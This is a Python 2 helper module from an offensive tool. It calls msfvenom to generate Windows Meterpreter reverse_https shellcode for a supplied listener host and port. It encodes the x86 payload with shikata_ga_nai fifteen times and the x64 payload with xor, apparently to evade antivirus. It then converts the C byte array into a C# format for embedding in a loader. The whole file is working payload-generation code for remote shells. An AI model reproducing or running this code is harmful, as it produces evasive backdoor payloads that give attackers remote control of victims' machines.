from subprocess import *

def create_shellcode(msfroot, lhost, lport, arch):
	msfvenom_cmd = None
	msfvenom = msfroot + "/msfvenom"
	if arch == "x86":
		msfvenom_cmd = (msfvenom + " -p windows/meterpreter/reverse_https LHOST=" + lhost + " LPORT=" + lport + " -e x86/shikata_ga_nai -i 15 -f c")
	elif arch == "x64":
		msfvenom_cmd = (msfvenom + " -p windows/x64/meterpreter/reverse_https LHOST=" + lhost + " LPORT=" + lport + " -e x64/xor -f c")
	else:
		raise ValueError("Incorrect architecture value passed to create_shellcode.")
	return build_shellcode(msfvenom_cmd)

def build_shellcode(msf_command):
	msfhandle = Popen(msf_command, shell=True, stdout=PIPE)
	try:
		shellcode = msfhandle.communicate()[0].split("unsigned char buf[] = ")[1]
	except IndexError:
		print "Error: Do you have the right path to msfvenom?"
		raise
	#put this in a C# format
	shellcode = shellcode.replace('\\', ',0').replace('"', '').strip()[1:-1]
	return shellcode
	

